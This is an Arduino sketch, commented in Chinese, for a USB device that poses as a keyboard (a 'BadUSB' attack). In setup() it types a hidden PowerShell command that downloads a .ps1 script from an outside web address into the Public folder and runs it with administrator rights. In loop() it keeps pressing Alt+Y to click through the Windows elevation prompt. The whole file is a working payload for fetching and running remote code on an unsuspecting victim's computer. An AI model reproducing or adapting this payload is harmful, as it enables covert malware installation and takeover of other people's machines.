void setup() {//初始化
  Keyboard.begin();//开始键盘通讯 
  delay(5000);//延时
  Keyboard.press(KEY_LEFT_GUI);//win键 
  delay(500); 
  Keyboard.press('r');//r键 
  delay(500); 
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);
  delay(500); 
  Keyboard.println("POWERSHELL -NOP");
  delay(1000);
  Keyboard.println("START-PROCESS -fILEpATH POWERSHELL \" -NOP -W HIDDEN -C SET-eXECUTIONpOLICY rEMOTEsIGNED -FORCE;CD $ENV:PUBLIC;(nEW-oBJECT sYSTEM.nET.wEBcLIENT).dOWNLOADfILE(\'HTTP://FQ.WC.LT/UP/1459435782.PS1\',\'C:\\USERS\\PUBLIC\\GET.PS1\');./GET.PS1;EXIT\" -vERB RUNAS;EXIT");
  delay(500);
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);
  Keyboard.end();//结束键盘通讯
}
void loop()//循环
{
  Keyboard.release(KEY_LEFT_ALT);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.print('y');
  Keyboard.release(KEY_LEFT_ALT);
  Keyboard.release(KEY_LEFT_ALT);
  Keyboard.release(KEY_LEFT_ALT);
  Keyboard.release(KEY_LEFT_ALT);
  delay(50);
}
